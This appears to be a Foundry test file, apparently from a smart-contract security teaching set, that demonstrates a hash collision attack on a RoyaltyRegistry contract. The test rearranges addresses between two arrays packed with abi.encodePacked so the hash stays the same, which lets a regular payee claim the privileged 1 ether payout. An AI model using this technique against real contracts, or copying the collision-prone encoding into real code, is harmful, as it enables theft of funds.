// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Test, console } from "forge-std/Test.sol";
import { RoyaltyRegistry } from "../../src/security/HashCollisions.sol";

contract HashCollisionTest is Test {
    RoyaltyRegistry registry;
    
    address alice = makeAddr("alice");
    address bob = makeAddr("bob");
    address charlie = makeAddr("charlie");
    address david = makeAddr("david");

    function setUp() public {
        registry = new RoyaltyRegistry();
        vm.deal(address(registry), 10 ether);
    }

    function testHashCollisionAttack() public {
        console.log("=== Hash Collision Attack Demo ===");
        
        // 1. 管理员授权正常的支付组合
        address[] memory privilegedOriginal = new address[](2);
        privilegedOriginal[0] = alice;
        privilegedOriginal[1] = bob;
        
        address[] memory regularOriginal = new address[](2);
        regularOriginal[0] = charlie;
        regularOriginal[1] = david;
        
        registry.authorize(privilegedOriginal, regularOriginal);
        
        bytes32 originalHash = keccak256(abi.encodePacked(privilegedOriginal, regularOriginal));
        console.log("Original hash authorized");
        console.logBytes32(originalHash);
        
        // 2. 攻击者重新排列地址来创建冲突
        // 将charlie移动到privileged数组中
        address[] memory privilegedAttack = new address[](3);
        privilegedAttack[0] = alice;
        privilegedAttack[1] = bob;
        privilegedAttack[2] = charlie;  // 原本应该得到regular payout的用户
        
        address[] memory regularAttack = new address[](1);
        regularAttack[0] = david;
        
        bytes32 attackHash = keccak256(abi.encodePacked(privilegedAttack, regularAttack));
        console.log("Attack hash");
        console.logBytes32(attackHash);
        
        // 3. 验证哈希碰撞
        assertEq(originalHash, attackHash, "Hashes should collide!");
        
        // 4. 记录攻击前的余额
        uint256 charlieBalanceBefore = charlie.balance;
        
        // 5. 执行攻击
        registry.claimRewards(privilegedAttack, regularAttack);
        
        // 6. 验证攻击结果
        uint256 charlieBalanceAfter = charlie.balance;
        
        // Charlie 原本应该得到 0.1 ether，但现在得到了 1 ether
        assertEq(charlieBalanceAfter - charlieBalanceBefore, 1 ether);
    }

    function testShowEncodingCollision() public {
        // 场景1：正常授权
        address[] memory set1Privileged = new address[](1);
        set1Privileged[0] = 0x1111111111111111111111111111111111111111;
        
        address[] memory set1Regular = new address[](1);
        set1Regular[0] = 0x2222222222222222222222222222222222222222;
        
        // 场景2：攻击重排
        address[] memory set2Privileged = new address[](2);
        set2Privileged[0] = 0x1111111111111111111111111111111111111111;
        set2Privileged[1] = 0x2222222222222222222222222222222222222222;
        
        address[] memory set2Regular = new address[](0);
        
        bytes memory encoded1 = abi.encodePacked(set1Privileged, set1Regular);
        bytes memory encoded2 = abi.encodePacked(set2Privileged, set2Regular);
        
        bytes32 hash1 = keccak256(encoded1);
        bytes32 hash2 = keccak256(encoded2);
        
        console.log("Hash :");
        console.logBytes32(hash1);
        
        assertEq(hash1, hash2, "Hashes should be equal!");
    }
}